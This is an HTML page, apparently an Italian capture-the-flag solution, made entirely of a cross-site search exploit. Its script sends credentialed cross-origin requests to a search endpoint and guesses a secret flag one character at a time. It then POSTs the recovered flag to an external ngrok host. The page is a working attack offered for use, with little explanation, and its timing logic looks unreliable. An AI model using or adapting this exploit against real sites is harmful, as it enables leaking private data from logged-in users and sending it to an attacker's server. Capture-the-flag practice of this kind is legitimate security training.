<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rubare Flag</title>
</head>
<body>
    <h1>Rubare la Flag dell'Architetto</h1>
    <script>
    const baseUrl = 'https://matrix.capturetheflags.site/search?s=flag{';
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[];:\'",.<>?/|\\';
    let currentFlag = 'flag{';
    let position = 5;

    const testChar = (position) => {
        if (position < 100) {
            for (let char of chars) {
                const query = `${baseUrl}${currentFlag}${char}`;
                const timeout = setTimeout(() => {
                    console.log(`Trovato carattere ${char} per la posizione ${position}`);
                    currentFlag += char;
                    testChar(currentFlag.length);
                }, 1000);  // Timeout di 1 secondo

                fetch(query, {
                    method: 'GET',
                    credentials: 'include',
                    mode: 'no-cors'
                })
                .then(() => clearTimeout(timeout))  // Se non ci sono errori, presumi che il carattere sia corretto
                .catch(error => console.error('Errore nella richiesta:', error));
            }
        } else {
            console.log(`Flag completa: ${currentFlag}`);
            fetch('https://bcc2-87-4-142-72.ngrok-free.app/receive_flag', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `flag=${encodeURIComponent(currentFlag)}`
            })
            .then(response => response.text())
            .then(data => console.log(data))
            .catch(error => console.error('Errore durante l\'invio della flag:', error));
        }
    };
    
    testChar(position);
    </script>
</body>
</html>
